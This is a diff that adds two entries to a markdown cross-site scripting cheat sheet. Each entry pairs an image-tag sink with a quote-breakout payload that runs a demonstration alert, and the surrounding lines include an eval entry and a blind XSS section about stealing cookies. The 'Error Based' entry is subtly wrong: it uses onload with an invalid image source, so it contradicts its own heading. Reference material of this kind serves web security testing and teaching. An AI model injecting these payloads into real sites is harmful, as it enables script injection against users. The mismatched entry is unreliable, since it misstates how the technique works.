@@ -181,6 +181,16 @@ Vulnerability - `eval(var data = parameter)`
 
 Exploit - `<script>alert(\'XSS Detected!\')</script>`
 ***
+#### Image Error Based DOM
+Vulnerability - `<img src="parameter">`
+
+Exploit - `x" onload="alert('XSS Detected!')`
+***
+#### Image Load Based DOM
+Vulnerability - `<img src="parameter">`
+
+Exploit - `/images/valid.png" onload="alert('XSS Detected!')`
+***
 #### Blind XSS
 - Contact form to staff member
   - Could reveal portal URL, cookies, r
